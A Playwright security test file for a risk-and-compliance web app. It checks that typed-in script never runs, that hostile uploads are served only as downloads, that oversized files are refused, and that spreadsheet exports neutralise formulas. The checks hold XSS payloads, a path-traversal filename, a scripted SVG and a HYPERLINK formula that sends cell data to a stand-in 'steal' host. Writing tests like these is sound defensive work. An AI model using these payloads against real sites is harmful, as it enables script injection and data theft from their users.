import { test, expect, type Page } from "@playwright/test";
import { signIn, open, has } from "./support.js";

/**
 * Attacks a user could make through the screens: script in anything they can
 * type, hostile files, an oversized file, and formulas in a spreadsheet export.
 */
test.beforeEach(async ({ page }) => { await signIn(page); });

// Each payload, if it ran, would bump window.__xss. None should.
const PAYLOADS = [
  `<img src=x onerror="window.__xss=(window.__xss||0)+1">`,
  `"><svg onload="window.__xss=(window.__xss||0)+1">`,
  `</textarea><script>window.__xss=(window.__xss||0)+1</script>`,
  `javascript:window.__xss=(window.__xss||0)+1`,
  `{{constructor.constructor('window.__xss=1')()}}`,
];

async function headers(page: Page): Promise<Record<string, string>> {
  return { "x-csrf-token": (await page.context().cookies()).find((c) => c.name === "offset_csrf")!.value };
}

test("script typed into any field never runs, on any screen", async ({ page }) => {
  test.setTimeout(240_000);
  const h = await headers(page);
  const dialogs: string[] = [];
  page.on("dialog", (d) => { dialogs.push(d.message()); void d.dismiss(); });

  // Into every kind of record a user can create, through the same API the screens use.
  for (const [i, p] of PAYLOADS.entries()) {
    await page.request.post("/api/v1/risks", { headers: h, data: { title: `XSS risk ${i} ${p}`, description: p, category: p, owner: p, likelihood: 2, impact: 2 } });
    await page.request.post("/api/v1/evidence", { headers: h, data: { name: `XSS evidence ${i} ${p}`, owner: p, notes: p, collectedDate: null } });
  }
  const { controls } = await (await page.request.get("/api/v1/controls")).json() as { controls: { id: string }[] };
  await page.request.patch(`/api/v1/controls/${controls[0]!.id}`, { headers: h, data: { owner: PAYLOADS[0], notes: PAYLOADS.join(" "), justification: PAYLOADS[1] } });
  for (const reg of ["assets", "policies", "tasks", "incidents", "findings", "vendors"]) {
    const field = reg === "assets" || reg === "policies" || reg === "vendors" ? "name" : "title";
    await page.request.post(`/api/v1/${reg}`, { headers: h, data: { [field]: `XSS ${reg} ${PAYLOADS[0]}`, notes: PAYLOADS[2], owner: PAYLOADS[1] } });
  }
  await page.request.post("/api/v1/users", { headers: h, data: { username: `xss${Date.now()}`, name: PAYLOADS[0], email: "xss@example.test", role: "readonly", password: "a-long-xss-test-passphrase" } });

  // Every screen in the menu, and the places that draw these records in their own way.
  await open(page, "dashboard");
  const hrefs = await page.locator(".sidebar .nav a").evaluateAll((as) => as.map((a) => a.getAttribute("href")!));
  for (const href of [...hrefs, "#/risks/thread"]) {
    await page.goto(`/${href}`);
    await page.reload();
    await expect(page.locator(".topbar h1")).not.toBeEmpty();
    await page.waitForTimeout(400);
    expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss), href).toBeUndefined();
  }
  await page.goto(`/#/controls/${controls[0]!.id}?fix=owner`);
  await expect(page.locator(".modal")).toBeVisible();
  await page.waitForTimeout(400);
  expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined();
  expect(dialogs).toEqual([]);

  // Shown as text, not swallowed.
  await page.goto("/#/risks");
  await page.reload();
  await expect(page.locator(".content")).toContainText(`XSS risk 0 <img src=x onerror=`);
});

test("an uploaded web page or SVG is only ever downloaded, never shown as a page", async ({ page }) => {
  const h = await headers(page);
  const ev = (await (await page.request.post("/api/v1/evidence", { headers: h, data: { name: "Hostile upload", collectedDate: null } })).json()).evidence as { id: string };
  for (const [name, type, body] of [
    ["../../evil.html", "text/html", "<script>alert(1)</script>"],
    ["drawing.svg", "image/svg+xml", `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`],
  ] as const) {
    const up = await page.request.post(`/api/v1/evidence/${ev.id}/file`, { headers: h, multipart: { file: { name, mimeType: type, buffer: Buffer.from(body) } } });
    expect(up.status(), `upload ${name}`).toBeLessThan(300);
    const down = await page.request.get(`/api/v1/evidence/${ev.id}/file`);
    expect(down.headers()["content-type"]).toBe("application/octet-stream");
    expect(down.headers()["content-disposition"]).toMatch(/^attachment;/);
    expect(down.headers()["x-content-type-options"]).toBe("nosniff");
    expect(down.headers()["content-disposition"]).not.toContain("../");
  }
});

test("a file larger than the limit is refused", async ({ page }) => {
  const h = await headers(page);
  const ev = (await (await page.request.post("/api/v1/evidence", { headers: h, data: { name: "Oversized upload", collectedDate: null } })).json()).evidence as { id: string };
  const big = Buffer.alloc(26 * 1024 * 1024, 65);
  const res = await page.request.post(`/api/v1/evidence/${ev.id}/file`, { headers: h, multipart: { file: { name: "big.bin", mimeType: "application/octet-stream", buffer: big } } });
  expect([400, 413]).toContain(res.status());
  expect(JSON.stringify(await res.json())).toMatch(/too large|limit|size/i);
  // Nothing was kept.
  expect((await page.request.get(`/api/v1/evidence/${ev.id}/file`)).status()).toBe(404);
});

test("a spreadsheet export shows a formula as text instead of running it", async ({ page }) => {
  test.skip(!has("csv"), "This product has no spreadsheet export.");
  const h = await headers(page);
  await open(page, "dashboard");
  const hrefs = await page.locator(".sidebar .nav a").evaluateAll((as) => as.map((a) => a.getAttribute("href")!));
  const reg = ["assets", "vendors", "tasks"].find((r) => hrefs.includes(`#/${r}`));
  test.skip(!reg, "No register with an export in this product.");
  const field = reg === "tasks" ? "title" : "name";
  const formula = `=HYPERLINK("https://example.test/steal?"&A1,"Click")`;
  expect((await page.request.post(`/api/v1/${reg}`, { headers: h, data: { [field]: formula } })).status()).toBeLessThan(300);
  await open(page, reg!);
  const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "Export CSV" }).click()]);
  const text = Buffer.concat(await (await download.createReadStream()).toArray()).toString("utf8");
  expect(text).toContain(`'=HYPERLINK(`);
  expect(text).not.toMatch(/(^|,)"?=HYPERLINK/m);
});
